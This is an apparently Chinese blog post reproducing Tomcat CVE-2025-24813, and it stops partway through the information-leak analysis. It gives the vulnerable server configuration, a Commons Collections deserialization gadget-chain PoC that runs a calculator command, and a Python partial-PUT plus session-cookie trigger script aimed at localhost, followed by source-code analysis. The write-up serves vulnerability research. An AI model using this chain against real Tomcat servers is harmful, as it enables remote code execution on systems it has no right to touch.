
<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>[Tomcat]CVE-2025-24813复现及原理分析 | GSBP&#39;s Blog</title>
    <meta name="description"
        content="前言
出了个通告说Tomcat有个新的cve，于是来尝试复现分析一下
通报
关于漏洞的通报细节如下








一看又是DefaultServlet的put方法上出的洞，这里漏洞利用有两种形式，一个是信息泄漏和篡改，还有一个是反序列化RCE，而且要求的前置项有点多，这里简单列出来
信息泄漏/篡改


ReadOnly为false


支持partial PUT方法


攻击者知道敏感文件的名称


安全敏感文件的上传目标 URL 是公开上传目标 URL 的子目录（？这个看不懂，也不知道啥意思）


反序列化RCE

ReadOnly为false
支持partial PUT方法
服务开启以文件为存储形式的持久化链接，并且采用默认位置
有能够引起反序列化漏洞的依赖

环境搭建
我参考的这篇文章搭建的环境
https://juejin.cn/post/7331544684290228250
接下来修改readonly
tomcat目录/conf/web.xml
    &lt;servlet&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;debug&lt;/param-name&gt;
            &lt;param-value&gt;0&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;listings&lt;/param-name&gt;
            &lt;param-value&gt;false&lt;/param-value&gt;
        &lt;/init-param&gt;
      &lt;init-param&gt;
        &lt;param-name&gt;readonly&lt;/param-name&gt;
        &lt;param-value&gt;false&lt;/param-value&gt;
      &lt;/init-param&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
开启持久化链接文件模式
tomcat目录/conf/context.xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the &#34;License&#34;); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;
&lt;!-- The contents of this file will be loaded for each web application --&gt;
&lt;Context&gt;

    &lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;
    &lt;!-- web application will be reloaded.                                   --&gt;
    &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;

    &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;
    &lt;!--
    &lt;Manager pathname=&#34;&#34; /&gt;
    --&gt;
  &lt;Manager className=&#34;org.apache.catalina.session.PersistentManager&#34;
           debug=&#34;0&#34;
           saveOnRestart=&#34;false&#34;
           maxActiveSession=&#34;-1&#34;
           minIdleSwap=&#34;-1&#34;
           maxIdleSwap=&#34;-1&#34;
           maxIdleBackup=&#34;-1&#34;&gt;
    &lt;Store className=&#34;org.apache.catalina.session.FileStore&#34; directory=&#34;&#34;/&gt;
  &lt;/Manager&gt;
&lt;/Context&gt;
往pom.xml下塞入CC依赖">
    <link rel="canonical" href="http://localhost:1313/post/tomcatcve-2025-24813%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css">
    
    <link rel="stylesheet" href="http://localhost:1313/scss/style.min.badf012c7f163854e3d9c3287a1df0863ae1974f62e123bbf1f2948b58ed39cf.css">

    <meta property="og:url" content="http://localhost:1313/post/tomcatcve-2025-24813%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
  <meta property="og:site_name" content="GSBP&#39;s Blog">
  <meta property="og:title" content="[Tomcat]CVE-2025-24813复现及原理分析">
  <meta property="og:description" content="前言 出了个通告说Tomcat有个新的cve，于是来尝试复现分析一下
通报 关于漏洞的通报细节如下
一看又是DefaultServlet的put方法上出的洞，这里漏洞利用有两种形式，一个是信息泄漏和篡改，还有一个是反序列化RCE，而且要求的前置项有点多，这里简单列出来
信息泄漏/篡改 ReadOnly为false
支持partial PUT方法
攻击者知道敏感文件的名称
安全敏感文件的上传目标 URL 是公开上传目标 URL 的子目录（？这个看不懂，也不知道啥意思）
反序列化RCE ReadOnly为false 支持partial PUT方法 服务开启以文件为存储形式的持久化链接，并且采用默认位置 有能够引起反序列化漏洞的依赖 环境搭建 我参考的这篇文章搭建的环境
https://juejin.cn/post/7331544684290228250
接下来修改readonly
tomcat目录/conf/web.xml
&lt;servlet&gt;&lt;servlet-name&gt;default&lt;/servlet-name&gt;&lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;&lt;init-param&gt;&lt;param-name&gt;debug&lt;/param-name&gt;&lt;param-value&gt;0&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;listings&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; 开启持久化链接文件模式
tomcat目录/conf/context.xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!--Licensed to the Apache Software Foundation (ASF) under one or morecontributor license agreements. See the NOTICE file distributed withthis work for additional information regarding copyright ownership.The ASF licenses this file to You under the Apache License, Version 2.0(the &#34;License&#34;); you may not use this file except in compliance withthe License. You may obtain a copy of the License athttp://www.apache.org/licenses/LICENSE-2.0Unless required by applicable law or agreed to in writing, softwaredistributed under the License is distributed on an &#34;AS IS&#34; BASIS,WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.See the License for the specific language governing permissions andlimitations under the License.--&gt;&lt;!-- The contents of this file will be loaded for each web application --&gt;&lt;Context&gt;&lt;!-- Default set of monitored resources. If one of these changes, the --&gt;&lt;!-- web application will be reloaded. --&gt;&lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;&lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;&lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;&lt;!--&lt;Manager pathname=&#34;&#34; /&gt;--&gt;&lt;Manager className=&#34;org.apache.catalina.session.PersistentManager&#34;debug=&#34;0&#34;saveOnRestart=&#34;false&#34;maxActiveSession=&#34;-1&#34;minIdleSwap=&#34;-1&#34;maxIdleSwap=&#34;-1&#34;maxIdleBackup=&#34;-1&#34;&gt;&lt;Store className=&#34;org.apache.catalina.session.FileStore&#34; directory=&#34;&#34;/&gt;&lt;/Manager&gt;&lt;/Context&gt; 往pom.xml下塞入CC依赖">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-03-12T18:00:00+08:00">
    <meta property="article:modified_time" content="2025-03-12T18:00:00+08:00">

    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="[Tomcat]CVE-2025-24813复现及原理分析">
  <meta name="twitter:description" content="前言 出了个通告说Tomcat有个新的cve，于是来尝试复现分析一下
通报 关于漏洞的通报细节如下
一看又是DefaultServlet的put方法上出的洞，这里漏洞利用有两种形式，一个是信息泄漏和篡改，还有一个是反序列化RCE，而且要求的前置项有点多，这里简单列出来
信息泄漏/篡改 ReadOnly为false
支持partial PUT方法
攻击者知道敏感文件的名称
安全敏感文件的上传目标 URL 是公开上传目标 URL 的子目录（？这个看不懂，也不知道啥意思）
反序列化RCE ReadOnly为false 支持partial PUT方法 服务开启以文件为存储形式的持久化链接，并且采用默认位置 有能够引起反序列化漏洞的依赖 环境搭建 我参考的这篇文章搭建的环境
https://juejin.cn/post/7331544684290228250
接下来修改readonly
tomcat目录/conf/web.xml
&lt;servlet&gt;&lt;servlet-name&gt;default&lt;/servlet-name&gt;&lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;&lt;init-param&gt;&lt;param-name&gt;debug&lt;/param-name&gt;&lt;param-value&gt;0&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;listings&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; 开启持久化链接文件模式
tomcat目录/conf/context.xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!--Licensed to the Apache Software Foundation (ASF) under one or morecontributor license agreements. See the NOTICE file distributed withthis work for additional information regarding copyright ownership.The ASF licenses this file to You under the Apache License, Version 2.0(the &#34;License&#34;); you may not use this file except in compliance withthe License. You may obtain a copy of the License athttp://www.apache.org/licenses/LICENSE-2.0Unless required by applicable law or agreed to in writing, softwaredistributed under the License is distributed on an &#34;AS IS&#34; BASIS,WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.See the License for the specific language governing permissions andlimitations under the License.--&gt;&lt;!-- The contents of this file will be loaded for each web application --&gt;&lt;Context&gt;&lt;!-- Default set of monitored resources. If one of these changes, the --&gt;&lt;!-- web application will be reloaded. --&gt;&lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;&lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;&lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;&lt;!--&lt;Manager pathname=&#34;&#34; /&gt;--&gt;&lt;Manager className=&#34;org.apache.catalina.session.PersistentManager&#34;debug=&#34;0&#34;saveOnRestart=&#34;false&#34;maxActiveSession=&#34;-1&#34;minIdleSwap=&#34;-1&#34;maxIdleSwap=&#34;-1&#34;maxIdleBackup=&#34;-1&#34;&gt;&lt;Store className=&#34;org.apache.catalina.session.FileStore&#34; directory=&#34;&#34;/&gt;&lt;/Manager&gt;&lt;/Context&gt; 往pom.xml下塞入CC依赖">

    

</head>
<body><nav class="navbar is-light" role="navigation">
    <div class="container">
        <div class="navbar-brand">
            <a href="/" title="home" class="navbar-item">
                <span class="logo">
                    <h1>GSBP&#39;s Blog</h1>
                </span>
            </a>

            
            <a id="theme-toggle" class="theme-toggle" href="#">
                <img src="http://localhost:1313/svg/sun.svg" alt="sun icon" class="theme-icon" />
            </a>

            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
            </a>
        </div>

        <div class="navbar-menu">
            <div class="navbar-start">
                
                <a href="/about" class="navbar-item">About</a>
                
                <a href="/post" class="navbar-item">Blog</a>
                
                <a href="/categories" class="navbar-item">Categories</a>
                
                <a href="/friend" class="navbar-item">Friends</a>
                
            </div>

        </div>
        <div class="search">
            <div id="fastSearch">
                <input id="searchInput" tabindex="0" placeholder="Search..">
                <ul id="searchResults">

                </ul>
            </div>
            <a id="search-btn" style="display: inline-block;" href="# ">
                <div class="icon-search"><svg class="search-svg" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
            </a>
        </div>

        <script src="/js/fuse.min.js"></script> 
        <script src="/js/fastsearch.js"></script>

    </div>
</nav>

<script>
    
    document.addEventListener('DOMContentLoaded', function() {
        var burger = document.querySelector('.navbar-burger');
        burger.addEventListener('click', function() {
            burger.classList.toggle('is-active');
            document.querySelector('.navbar-menu').classList.toggle('is-active');
        });
    });

    
    function setTheme(theme) {
        let body = document.body;
        let themeIcon = document.querySelector(".theme-icon");
        if (theme === "dark") {
            body.classList.add("dark-mode");
            themeIcon.src = "http:\/\/localhost:1313\/svg/moon.svg";
            themeIcon.alt = "moon icon";
        } else {
            body.classList.remove("dark-mode");
            themeIcon.src = "http:\/\/localhost:1313\/svg/sun.svg";
            themeIcon.alt = "sun icon";
        }
        
        localStorage.setItem("theme", theme);
    }

    
    let theme = localStorage.getItem("theme") || "light";
    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    if (isDarkMode) {
        
        setTheme('dark');

    } else {
        
        setTheme('light');
    }
    setTheme(theme);

    
    document.getElementById("theme-toggle").addEventListener("click", function() {
        if (theme === "light") {
            theme = "dark";
        } else {
            theme = "light";
        }
        setTheme(theme);
    });



</script>

</header><main>
<div class="single-container">
    <div class="archive">
        <h1 class="title is-1">[Tomcat]CVE-2025-24813复现及原理分析</h1>
        <div class="title subtitle heading is-6">
            <div class="author-info columns is-vcentered">
                <div class="column">
                    <div class="columns is-vcentered is-mobile">
                        
                        <div class="column is-narrow">
                            <img src="/img/GSBP.jpg" class="author-image">
                        </div>
                        
                        <div class="column">
                            <p>GSBP</p>
                            <p><time>March 12, 2025</time>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="small-categories-container">
                    <a href="/categories/java%E5%AE%89%E5%85%A8">Java安全</a>, <a href="/categories/cve">CVE</a>
                </div>
            </div>
        </div>
        <div class="content article-content">
            <div class="toc-container">
                
    <div class="post-toc">
        
            <aside>
                <button id="tocButton" ><h4 id="contents" style="margin-left: 1vw;color:rgb(96, 134, 180);margin-bottom: 0;">CONTENTS</h4></button>
                <div id="hide"><nav id="TableOfContents">
  <ul>
    <li><a href="#前言">前言</a></li>
    <li><a href="#通报">通报</a>
      <ul>
        <li><a href="#信息泄漏篡改">信息泄漏/篡改</a></li>
        <li><a href="#反序列化rce">反序列化RCE</a></li>
      </ul>
    </li>
    <li><a href="#环境搭建">环境搭建</a></li>
    <li><a href="#漏洞复现">漏洞复现</a></li>
    <li><a href="#原理分析">原理分析</a>
      <ul>
        <li><a href="#其一">其一</a></li>
        <li><a href="#其二">其二</a></li>
        <li><a href="#信息泄露篡改">信息泄露&amp;篡改</a></li>
      </ul>
    </li>
    <li><a href="#结尾">结尾</a></li>
  </ul>
</nav></div>
            </aside>
        
    </div><script>
    
        let button = document.getElementById('tocButton');
        let hide = document.getElementById("hide");
        let contents=document.getElementById("contents");
        button.addEventListener("click", function() {
        if (hide.style.display!='block') {
            hide.style.display='block'
        } else {
            hide.style.display='none'
            contents.style.color='rgb(96, 134, 180)'
        }
        });
    




</script>
            </div>
            <h2 id="前言">前言</h2>
<p>出了个通告说Tomcat有个新的cve，于是来尝试复现分析一下</p>
<h2 id="通报">通报</h2>
<p>关于漏洞的通报细节如下</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312143659450.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312143659450.png" alt="image-20250312143659450"  />
</a>
</div>

</p>
<p>一看又是DefaultServlet的put方法上出的洞，这里漏洞利用有两种形式，一个是信息泄漏和篡改，还有一个是反序列化RCE，而且要求的前置项有点多，这里简单列出来</p>
<h3 id="信息泄漏篡改">信息泄漏/篡改</h3>
<ul>
<li>
<p>ReadOnly为false</p>
</li>
<li>
<p>支持partial PUT方法</p>
</li>
<li>
<p>攻击者知道敏感文件的名称</p>
</li>
<li>
<p>安全敏感文件的上传目标 URL 是公开上传目标 URL 的子目录（？这个看不懂，也不知道啥意思）</p>
</li>
</ul>
<h3 id="反序列化rce">反序列化RCE</h3>
<ul>
<li>ReadOnly为false</li>
<li>支持partial PUT方法</li>
<li>服务开启以文件为存储形式的持久化链接，并且采用默认位置</li>
<li>有能够引起反序列化漏洞的依赖</li>
</ul>
<h2 id="环境搭建">环境搭建</h2>
<p>我参考的这篇文章搭建的环境</p>
<p><a href="https://juejin.cn/post/7331544684290228250">https://juejin.cn/post/7331544684290228250</a></p>
<p>接下来修改readonly</p>
<p><code>tomcat目录/conf/web.xml</code></p>
<pre tabindex="0"><code>    &lt;servlet&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;debug&lt;/param-name&gt;
            &lt;param-value&gt;0&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;listings&lt;/param-name&gt;
            &lt;param-value&gt;false&lt;/param-value&gt;
        &lt;/init-param&gt;
      &lt;init-param&gt;
        &lt;param-name&gt;readonly&lt;/param-name&gt;
        &lt;param-value&gt;false&lt;/param-value&gt;
      &lt;/init-param&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
</code></pre><p>开启持久化链接文件模式</p>
<p><code>tomcat目录/conf/context.xml</code></p>
<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the &#34;License&#34;); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;
&lt;!-- The contents of this file will be loaded for each web application --&gt;
&lt;Context&gt;

    &lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;
    &lt;!-- web application will be reloaded.                                   --&gt;
    &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;

    &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;
    &lt;!--
    &lt;Manager pathname=&#34;&#34; /&gt;
    --&gt;
  &lt;Manager className=&#34;org.apache.catalina.session.PersistentManager&#34;
           debug=&#34;0&#34;
           saveOnRestart=&#34;false&#34;
           maxActiveSession=&#34;-1&#34;
           minIdleSwap=&#34;-1&#34;
           maxIdleSwap=&#34;-1&#34;
           maxIdleBackup=&#34;-1&#34;&gt;
    &lt;Store className=&#34;org.apache.catalina.session.FileStore&#34; directory=&#34;&#34;/&gt;
  &lt;/Manager&gt;
&lt;/Context&gt;
</code></pre><p>往pom.xml下塞入CC依赖</p>
<pre tabindex="0"><code>    &lt;dependency&gt;
      &lt;groupId&gt;commons-collections&lt;/groupId&gt;
      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
      &lt;version&gt;3.2.1&lt;/version&gt;
    &lt;/dependency&gt;
</code></pre><h2 id="漏洞复现">漏洞复现</h2>
<p>开启服务</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145524530.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145524530.png" alt="image-20250312145524530"  />
</a>
</div>

</p>
<p>然后跑个cc的poc</p>
<pre tabindex="0"><code>package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.util.*;
import java.lang.reflect.*;

public class Main {

    public static void main(String[] args) throws Exception {
        String cmd=&#34;open -a calculator&#34;;
        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&#34;getMethod&#34;,new Class[]{String.class,Class[].class},new Object[]{&#34;getRuntime&#34;,new Class[0]}),
                new InvokerTransformer(&#34;invoke&#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);

        HashMap hsmap=new HashMap();
        hsmap.put(&#34;value&#34;,&#34;test&#34;);

        Map transformedMap=TransformedMap.decorate(hsmap,null,chainedTransformer);

        Class aclass=Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);
        Constructor constructor=aclass.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object handler = constructor.newInstance(Target.class,transformedMap);

        FileOutputStream bao=new FileOutputStream(&#34;ser&#34;);
        ObjectOutputStream oos=new ObjectOutputStream(bao);
        oos.writeObject(handler);
        oos.close();

    }

}
</code></pre><p>得到ser文件之后再跑下面脚本</p>
<pre tabindex="0"><code>import requests
data=open(&#34;ser&#34;,&#34;rb&#34;).read()
headers={&#34;Content-Range&#34;:&#34;bytes 0-10000/67589&#34;}
url=&#34;http://127.0.0.1:8081/evil/session&#34;
requests.put(url,headers=headers,data=data)
requests.get(url,headers={&#34;Cookie&#34;:&#34;JSESSIONID=.evil&#34;})
</code></pre><p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145744884.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145744884.png" alt="image-20250312145744884"  />
</a>
</div>

</p>
<h2 id="原理分析">原理分析</h2>
<h3 id="其一">其一</h3>
<p>漏洞点在<code>DefaultServlet</code>下的doPut方法中调用<code> executePartialPut</code>方法</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312150329188.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312150329188.png" alt="image-20250312150329188"  />
</a>
</div>

</p>
<p>在<code> executePartialPut</code>方法中,根据传入的path，request创建临时文件，保存地址为当前ServletContext下的临时文件夹的根目录下面，且将path中的<code>/</code>转化为了<code>.</code></p>
<pre tabindex="0"><code>protected File executePartialPut(HttpServletRequest req, Range range, String path) throws IOException {

    // Append data specified in ranges to existing content for this
    // resource - create a temp. file on the local filesystem to
    // perform this operation
    File tempDir = (File) getServletContext().getAttribute(ServletContext.TEMPDIR);
    // Convert all &#39;/&#39; characters to &#39;.&#39; in resourcePath
    String convertedResourcePath = path.replace(&#39;/&#39;, &#39;.&#39;);
    File contentFile = new File(tempDir, convertedResourcePath);
    if (contentFile.createNewFile()) {
        // Clean up contentFile when Tomcat is terminated
        contentFile.deleteOnExit();
    }

    try (RandomAccessFile randAccessContentFile = new RandomAccessFile(contentFile, &#34;rw&#34;)) {

        WebResource oldResource = resources.getResource(path);

        // Copy data in oldRevisionContent to contentFile
        if (oldResource.isFile()) {
            try (BufferedInputStream bufOldRevStream =
                    new BufferedInputStream(oldResource.getInputStream(), BUFFER_SIZE)) {

                int numBytesRead;
                byte[] copyBuffer = new byte[BUFFER_SIZE];
                while ((numBytesRead = bufOldRevStream.read(copyBuffer)) != -1) {
                    randAccessContentFile.write(copyBuffer, 0, numBytesRead);
                }

            }
        }

        randAccessContentFile.setLength(range.length);

        // Append data in request input stream to contentFile
        randAccessContentFile.seek(range.start);
        int numBytesRead;
        byte[] transferBuffer = new byte[BUFFER_SIZE];
        try (BufferedInputStream requestBufInStream = new BufferedInputStream(req.getInputStream(), BUFFER_SIZE)) {
            while ((numBytesRead = requestBufInStream.read(transferBuffer)) != -1) {
                randAccessContentFile.write(transferBuffer, 0, numBytesRead);
            }
        }
    }

    return contentFile;
}
</code></pre><p>在调用<code>executePartialPut</code>之前有个要求，需要我们的range不为空或<code>IGNORE</code>,其实就是需要我们添加一个合法的<code>Content-Range</code>请求头便可以成功创建</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151011961.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151011961.png" alt="image-20250312151011961"  />
</a>
</div>

</p>
<pre tabindex="0"><code>    protected Range parseContentRange(HttpServletRequest request, HttpServletResponse response) throws IOException {

        // Retrieving the content-range header (if any is specified
        String contentRangeHeader = request.getHeader(&#34;Content-Range&#34;);

        if (contentRangeHeader == null) {
            return IGNORE;
        }

        if (!allowPartialPut) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }

        ContentRange contentRange = ContentRange.parse(new StringReader(contentRangeHeader));

        if (contentRange == null) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }


        // bytes is the only range unit supported
        if (!contentRange.getUnits().equals(&#34;bytes&#34;)) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }

        // TODO: Remove the internal representation and use Ranges
        // Convert to internal representation
        Range range = new Range();
        range.start = contentRange.getStart();
        range.end = contentRange.getEnd();
        range.length = contentRange.getLength();

        if (!range.validate()) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }

        return range;
    }
</code></pre><p>我这里成功put之后，缓存文件所在文件夹位于<code>apache-tomcat-9.0.85-src/work/Catalina/localhost/ROOT</code>，</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151349915.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151349915.png" alt="image-20250312151349915"  />
</a>
</div>

</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151412366.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151412366.png" alt="image-20250312151412366"  />
</a>
</div>

</p>
<h3 id="其二">其二</h3>
<p>session文件的默认存储点正好位于当前Context的临时文件夹下</p>
<p><code>FileStore.load</code></p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181228233.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181228233.png" alt="image-20250312181228233"  />
</a>
</div>

</p>
<p>用户在使用JSESSIONID=id的情况下访问服务，FileStore会自动的去临时文件夹下寻找名字为<code>id.session</code>的文件并且进行反序列化操作
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181547867.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181547867.png" alt="image-20250312181547867"  />
</a>
</div>

</p>
<p>所以攻击思路就串联起来了</p>
<ul>
<li>攻击者通过partialPut方法往服务临时文件夹塞入存有反序列化数据的文件</li>
<li>攻击者再次构造JSESSIONID为<code>.filename.session</code>的请求，触发反序列化攻击</li>
</ul>
<h3 id="信息泄露篡改">信息泄露&amp;篡改</h3>
<p>这里我看了一会儿没思考出来这个信息泄漏的手法，讲讲我在思考过程中发现的一些可疑点吧(方向不保证对)</p>
<p>在我们创建了range的情况下，下方这个if分支语句下我们能够执行两端代码，一个是<code>PartialPut</code>方法，另一个则是根据contentFile来创建一个</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182108725.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182108725.png" alt="image-20250312182108725"  />
</a>
</div>

</p>
<p>不同于<code>resourceInputStream = req.getInputStream();</code>的直接从req中读取我们的输入内容，这里的是根据我们的路径寻找对应文件下的内容</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182456062.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182456062.png" alt="image-20250312182456062"  />
</a>
</div>

</p>
<p>这里需要注意的是，我们put的路径也并非是需要文件夹下不存在的文件，存在的文件我们也可以执行partialPut方法，方法会根据我们的<code>Content-Range</code>头来讲我们put的<code>body</code>内容覆盖对应range的数据，这里简单展示一下</p>
<p>访问已存在的123文件</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182816636.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182816636.png" alt="image-20250312182816636"  />
</a>
</div>

</p>
